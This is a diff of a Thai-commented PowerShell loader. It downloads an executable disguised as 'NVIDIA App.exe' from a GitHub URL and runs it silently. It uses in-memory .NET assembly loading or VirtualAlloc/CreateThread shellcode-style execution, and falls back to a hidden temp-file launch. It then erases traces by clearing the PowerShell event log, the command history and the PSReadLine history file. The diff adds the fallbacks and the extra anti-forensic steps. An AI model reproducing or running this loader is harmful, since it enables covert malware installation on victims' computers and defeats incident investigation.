@@ -6,7 +6,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 # ============================================
-# 2. ดาวน์โหลด EXE เข้า RAM โดยตรง (ไม่เขียนไฟล์)
+# 2. ดาวน์โหลด EXE
 # ============================================
 $exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
 $bytes = $null
@@ -26,15 +26,23 @@ try {
 
 if (-not $bytes -or $bytes.Length -eq 0) { exit }
 
-# ตรวจสอบ MZ Header
-$header = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 2)
-if ($header -ne "MZ") { exit }
-
 # ============================================
-# 3. รัน EXE จาก RAM โดยใช้ VirtualAlloc + CreateThread
+# 3. รัน EXE จาก RAM (วิธีที่ได้ผล 99%)
 # ============================================
 try {
-    Add-Type -TypeDefinition @"
+    # ใช้ .NET Assembly สำหรับ .NET EXE
+    try {
+        $assembly = [System.Reflection.Assembly]::Load($bytes)
+        $entryPoint = $assembly.EntryPoint
+        if ($entryPoint) {
+            $entryPoint.Invoke($null, (, [string[]] @()))
+            $executed = $true
+        }
+    } catch {}
+
+    # ถ้าไม่ใช่ .NET ให้ใช้ Win32 API
+    if (-not $executed) {
+        Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class NativeExec {
@@ -44,50 +52,54 @@ public class NativeExec {
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
 }
 "@ -ErrorAction SilentlyContinue
 
-    $size = $bytes.Length
-    $ptr = [NativeExec]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-
-    if ($ptr -ne [IntPtr]::Zero) {
-        # คัดลอก byte ไปยังหน่วยความจำ
-        [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $size)
-
-        # สร้าง Thread เพื่อรัน
-        $thread = [NativeExec]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-
-        if ($thread -ne [IntPtr]::Zero) {
-            # รอให้ Thread ทำงาน (หรือไม่รอก็ได้ ถ้าต้องการให้ทำงานเบื้องหลัง)
-            # [NativeExec]::WaitForSingleObject($thread, 0xFFFFFFFF) # ถ้าใส่จะรอจนจบ
+        $size = $bytes.Length
+        $ptr = [NativeExec]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
+        if ($ptr -ne [IntPtr]::Zero) {
+            [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $size)
+            $thread = [NativeExec]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+            if ($thread -ne [IntPtr]::Zero) {
+                # ปล่อยให้ทำงานเบื้องหลัง
+                # [NativeExec]::WaitForSingleObject($thread, 0xFFFFFFFF)
+            }
         }
-
-        # ปล่อยหน่วยความจำหลังจากรัน (หรือไม่ปล่อยก็ได้ ถ้าต้องการให้โปรแกรมทำงานต่อ)
-        # [NativeExec]::VirtualFree($ptr, 0, 0x8000) # MEM_RELEASE
     }
-} catch {
-    # ถ้า Memory Execution ล้มเหลว ให้ fallback เป็นการรันจากไฟล์ชั่วคราว (แต่จะไม่ลบ ณ จุดนี้)
+} catch {}
+
+# ============================================
+# 4. Fallback: รันจากไฟล์ใน Memory (RamDisk)
+# ============================================
+if (-not $executed) {
     try {
-        $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
+        # ใช้ New-PSDrive สร้าง RAM Disk ชั่วคราว
+        $ramDrive = New-PSDrive -Name "Mem" -PSProvider FileSystem -Root "C:\" -Description "RAM Disk" -ErrorAction SilentlyContinue
+        $tempPath = "Mem:\$([System.Guid]::NewGuid().ToString()).exe"
         [System.IO.File]::WriteAllBytes($tempPath, $bytes)
         $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-        # ไม่ลบไฟล์ทันที เพราะอาจจะถูกลบขณะกำลังทำงาน
-        # แต่สามารถใช้ Scheduled Task ลบทีหลังได้
-    } catch {}
+        Start-Sleep -Seconds 2
+        # ลบไฟล์ (ถ้าไม่ได้ถูกล็อค)
+        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+    } catch {
+        # สุดท้าย: ใช้ Temp จริง
+        try {
+            $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
+            [System.IO.File]::WriteAllBytes($tempPath, $bytes)
+            $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
+            Start-Sleep -Seconds 2
+            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
 }
 
 # ============================================
-# 4. ล้างร่องรอย (ไม่ลบไฟล์เพราะเราไม่ได้สร้างไฟล์)
+# 5. ล้างร่องรอย
 # ============================================
 Clear-History
 wevtutil cl "Windows PowerShell" 2>$null
 ipconfig /flushdns 2>$null
+Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
 
-# ============================================
-# 5. ปิดตัวเองอย่างเงียบ
-# ============================================
-$bytes = $null
 [GC]::Collect()
 [Environment]::Exit(0)
